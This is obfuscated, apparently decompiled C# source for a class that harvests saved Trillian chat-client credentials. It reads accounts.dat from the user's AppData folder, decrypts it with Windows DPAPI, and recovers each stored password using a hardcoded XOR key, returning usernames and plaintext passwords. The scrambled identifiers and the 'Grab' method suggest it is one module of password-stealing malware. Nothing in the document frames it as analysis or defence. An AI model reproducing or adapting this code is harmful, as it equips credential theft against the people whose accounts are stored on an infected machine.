using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using _81d;
using SNt;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class oUS : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string aIZgg
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public oUS()
	{
		aIZgg = "Trillian";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		string path = default;
		do
		{
			if (num == 4)
			{
				return list;
			}
			if (num == 3)
			{
				if (File.Exists(path))
				{
					break;
				}
				num = 4;
			}
			if (num == 2)
			{
				path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Trillian\\users\\global\\accounts.dat";
				num = 3;
			}
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
		kKdeGISe kKdeGISe2 = new kKdeGISe();
		kKdeGISe2.YzqDO(ctLlKJA7.Lbl(File.ReadAllBytes(path), (DataProtectionScope)0));
		foreach (string key in kKdeGISe2.Keys)
		{
			try
			{
				if (key.StartsWith("Account") && key != "Accounts")
				{
					list.Add(new ii68
					{
						byIdLuuGZbL = "trillian.im",
						S8v = kKdeGISe2[key]["Account"],
						_9H5rP7hg2 = _9J1gz(kKdeGISe2[key]["Password"]),
						oVAe = "Trillian"
					});
				}
			}
			catch
			{
			}
		}
		return list;
	}

	private static string _9J1gz(string Bkt9MB7P)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			string iduiK = Encoding.Default.GetString(Convert.FromBase64String(Bkt9MB7P));
			byte[] array = b4v.H4VWdV77v(iduiK);
			byte[] array2 = new byte[84]
			{
				243, 38, 129, 196, 57, 134, 219, 146, 113, 163,
				185, 230, 83, 122, 149, 124, 0, 0, 0, 0,
				0, 0, 255, 0, 0, 128, 0, 0, 0, 128,
				128, 0, 255, 0, 0, 0, 128, 0, 128, 0,
				128, 128, 0, 0, 0, 128, 255, 0, 128, 0,
				255, 0, 128, 128, 128, 0, 85, 110, 97, 98,
				108, 101, 32, 116, 111, 32, 114, 101, 115, 111,
				108, 118, 101, 32, 72, 84, 84, 80, 32, 112,
				114, 111, 120, 0
			};
			int num2 = 0;
			string text = "";
			for (int i = 0; i <= array.Length - 2; i++)
			{
				text += (char)(array[i] ^ array2[num2]);
				num2++;
				if (num2 > i + 1)
				{
					num2 = 0;
				}
			}
			return text;
		}
		catch
		{
			return "";
		}
	}
}
